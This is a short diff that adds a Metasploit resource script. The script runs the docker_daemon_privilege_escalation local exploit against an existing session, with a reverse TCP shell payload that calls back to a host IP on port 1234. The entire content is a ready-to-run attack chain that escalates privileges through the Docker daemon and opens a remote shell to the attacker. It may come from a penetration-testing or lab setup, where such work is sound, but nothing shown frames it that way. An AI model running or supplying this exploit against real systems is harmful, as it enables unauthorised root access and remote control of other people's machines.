@@ -1,0 +1,7 @@
+use exploit/linux/local/docker_daemon_privilege_escalation
+set payload linux/x86/shell_reverse_tcp
+set lhost $HOST_IP
+set lport 1234
+set session $SESSION
+exploit -j
+
